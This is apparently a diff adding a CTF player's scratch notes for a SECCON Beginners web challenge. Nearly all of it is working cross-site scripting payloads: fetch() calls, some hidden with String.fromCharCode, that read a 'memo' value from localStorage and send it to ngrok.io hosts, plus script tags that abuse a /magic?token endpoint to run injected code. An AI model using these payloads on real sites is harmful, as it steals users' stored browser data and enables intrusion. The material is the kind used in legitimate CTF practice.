@@ -1,0 +1,15 @@
+Aa0aaaaaaaaaaaaa
+https://magic.quals.beginners.seccon.jp/magic?token=024244c0-bc5c-4474-be5d-18eb8ea34283
+https://magic.quals.beginners.seccon.jp/magic?token=024244c0-bc5c-4474-be5d-18eb8ea34283
+
+fetch(String.fromCharCode(104,116,116,112,115,58,47,47,48,101,100,100,55,54,50,97,48,54,98,98,46,110,103,114,111,107,46,105,111,47,63,99,116,102,52,98,102,108,97,103,61)%2BencodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));
+
+
+fetch("https://a457923856fa.ngrok.io/?ctf4bflag="+encodeURI(localStorage.getItem("memo")));
+
+<script src="/magic?token=fetch(String.fromCharCode(104,116,116,112,115,58,47,47,97,52,53,55,57,50,51,56,53,54,102,97,46,110,103,114,111,107,46,105,111,47,61)%2BencodeURI(localStorage.getItem(String.fromCharCode(109,101,109,111))));//"></script>
+
+<script src="/magic?token=alert(1)//"></script>
+
+
+104 116 116 112 115 58 47 47 48 101 100 100 55 54 50 97 48 54 98 98 46 110 103 114 111 107 46 105 111 47 63 99 116 102 52 98 102 108 97 103 61
